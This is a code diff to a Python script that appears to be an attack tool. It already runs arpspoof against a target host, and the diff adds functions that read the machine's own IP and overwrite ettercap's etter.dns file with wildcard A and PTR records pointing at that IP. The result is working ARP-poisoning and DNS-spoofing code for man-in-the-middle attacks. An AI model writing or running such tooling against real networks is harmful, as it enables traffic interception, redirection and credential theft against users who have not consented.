@@ -37,6 +37,17 @@ def getGatewayIP():
                 return line.split()[2]
         raise Exception("Gateway IP not found.")
 
+def getMachineIPAddress():
+    cmd = "hostname -I | awk \'{print $1}\'"
+    ip_addr = str(os.popen(cmd).read()).strip('\n')
+    return ip_addr
+
+def ettercapConfiguration(ip_address):
+    with open("/etc/ettercap/etter.dns", "w+") as etter:
+        etter.write("* A {}".format(ip_address))
+        etter.write("* PTR {}".format(ip_address))
+    
+
 def arpPoison(interface_name, host):
     arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return arpSpoofProc
